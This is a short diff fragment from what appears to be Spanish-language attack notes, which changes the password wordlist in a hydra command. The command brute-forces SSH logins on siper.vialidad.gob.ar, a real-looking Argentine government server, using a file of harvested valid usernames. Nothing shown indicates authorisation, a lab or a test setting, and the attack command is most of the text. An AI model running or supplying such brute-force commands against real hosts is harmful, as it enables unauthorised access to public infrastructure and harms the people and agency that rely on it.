@@ -562,7 +562,7 @@ Recopilar información
     echo "Target: siper.vialidad.gob.ar:22"
 
     # Usar hydra con lista de usuarios encontrados y contraseñas comunes
-    hydra -L usuarios_validos.txt -P /usr/share/wordlists/rockyou.txt \
+    hydra -L usuarios_validos.txt -P /usr/share/wordlists/lista_custom.txt \
     ssh://siper.vialidad.gob.ar -t 4 -V
    ```
 mucho tiempo...
